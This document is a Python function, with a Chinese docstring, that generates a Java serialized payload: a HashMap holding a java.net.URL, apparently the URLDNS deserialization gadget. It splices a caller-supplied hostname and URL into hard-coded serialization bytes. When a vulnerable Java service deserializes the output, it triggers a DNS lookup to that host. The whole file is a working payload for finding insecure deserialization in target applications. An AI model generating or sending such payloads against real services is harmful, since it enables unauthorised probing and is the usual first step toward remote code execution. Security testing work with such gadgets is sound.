def urldns(url: str) -> bytes:
    """
    输入包含协议的url
    """
    from urllib.parse import urlparse
    prefix = "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74"
    midfix = "74000071007e000574000468747470707874"
    postfix = "78"
    o = urlparse(url)
    length = len(o.hostname).to_bytes(2, byteorder="big").hex()
    length2 = len(url).to_bytes(2, byteorder="big").hex()
    hexdata = prefix + length + o.hostname.encode().hex() + midfix + length2 + url.encode().hex() + postfix
    data = bytes.fromhex(hexdata)
    return data
